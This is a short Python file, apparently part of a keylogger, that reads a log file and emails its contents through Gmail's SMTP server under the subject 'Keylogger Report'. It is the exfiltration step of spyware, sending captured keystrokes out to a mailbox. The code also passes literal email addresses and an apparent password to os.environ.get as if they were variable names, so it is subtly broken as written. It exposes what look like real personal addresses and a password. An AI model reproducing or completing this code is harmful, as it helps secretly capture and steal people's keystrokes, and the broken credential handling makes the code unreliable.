# remote_logger.py
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os

def send_log_via_email(log_file):
    email_user = os.environ.get('suleimanayomide716@gmail.com')
    email_password = os.environ.get('Ayomide(1234)')
    email_send = os.environ.get('kolawolesuleiman716@gmail.com')

    subject = 'Keylogger Report'

    msg = MIMEMultipart()
    msg['From'] = email_user
    msg['To'] = email_send
    msg['Subject'] = subject

    with open(log_file, 'r') as f:
        body = f.read()

    msg.attach(MIMEText(body, 'plain'))

    text = msg.as_string()

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email_user, email_password)
    server.sendmail(email_user, email_send, text)
    server.quit()
